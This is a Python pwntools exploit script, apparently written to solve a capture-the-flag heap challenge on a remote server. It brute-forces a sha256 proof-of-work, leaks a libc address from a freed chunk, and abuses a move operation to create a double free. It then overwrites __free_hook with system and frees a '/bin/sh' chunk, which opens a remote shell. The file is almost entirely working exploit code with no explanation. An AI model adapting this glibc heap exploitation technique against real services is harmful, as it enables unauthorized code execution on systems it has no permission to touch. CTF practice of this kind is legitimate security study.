# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True

io = remote('chuj.top', 53175) # nc chuj.top 53175
libc = ELF('./libc.so.6')
# io = process('vector')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('3')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('4')
	sla('index?\n>> ',str(idx))

def edit(idx):
    sl('2')
def move(from_idx,to_idx):
    sl('5')
    for i in range(from_idx):
        sa('move? [1/0]\n>> ',str(0))
    
    sa('move? [1/0]\n>> ',str(1))
    sa('move to?\n>> ',str(to_idx))


if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(8):
    add(i,0x100,str(i))
for i in range(8,10):
    add(i,0x70,str(i))
for i in range(1,8):
    delete(i)
delete(0)
add(0,0x50,'aaaaaaaa')
show(0)
ru('aaaaaaaa')
libcbase = l64() - 0x1ebce0
lg('libcbase')
system = libcbase + libc.symbols['system']
freehook = libcbase + libc.symbols['__free_hook']
lg('system')
lg('freehook')
# dbg()
for i in range(1,8):
    add(i,0x70,str(i))
# dbg()
move(2,17)
add(10,0x70,str(10))
for i in range(3,10):
    delete(i)
delete(2)
delete(10)
delete(17)

for i in range(2,9):
    add(i,0x70,str(i))

add(9,0x70,p64(freehook))

add(11,0x70,'11')
add(12,0x70,'/bin/sh\x00')
add(13,0x70,p64(system))

delete(12)


irt()


